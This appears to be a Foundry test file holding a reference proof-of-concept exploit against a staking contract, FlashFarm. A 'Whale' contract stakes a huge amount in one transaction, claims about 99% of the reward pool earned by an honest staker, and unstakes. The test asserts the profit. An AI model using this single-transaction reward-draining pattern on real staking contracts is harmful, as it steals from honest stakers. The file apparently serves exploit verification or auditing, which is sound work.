// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Reference exploit for FlashFarm. A whale stakes ~99% for one transaction, claims ~99% of the
// reward pool the honest staker earned, and unstakes.
// Run by hand:  forge test --root proofground --match-contract ProveFlashFarm -vvv

import {ExploitProof} from "@proof/ExploitProof.sol";
import {Token, FlashFarm} from "@contracts/FlashFarm.sol";

contract Whale {
    Token stake;
    Token reward;
    FlashFarm farm;

    constructor(Token _stake, Token _reward, FlashFarm _farm) {
        stake = _stake;
        reward = _reward;
        farm = _farm;
    }

    function raid(uint256 amount) external {
        stake.mint(address(this), amount);
        stake.approve(address(farm), amount);
        farm.stake(amount);
        farm.claim();
        farm.unstake(amount);
    }
}

contract ProveFlashFarm is ExploitProof {
    function test_exploit() external {
        Token stake = new Token();
        Token reward = new Token();
        FlashFarm farm = new FlashFarm(stake, reward);

        // honest staker holds the whole farm
        address alice = makeAddr("alice");
        stake.mint(alice, 100e18);
        vm.startPrank(alice);
        stake.approve(address(farm), 100e18);
        farm.stake(100e18);
        vm.stopPrank();

        // reward pool funded
        reward.mint(address(this), 1000e18);
        reward.approve(address(farm), 1000e18);
        farm.fund(1000e18);

        Whale whale = new Whale(stake, reward, farm);
        whale.raid(9900e18);

        profit = reward.balanceOf(address(whale)); // ~990e18 reward tokens, committed nothing
        assertExploitLanded(500e18);
    }
}
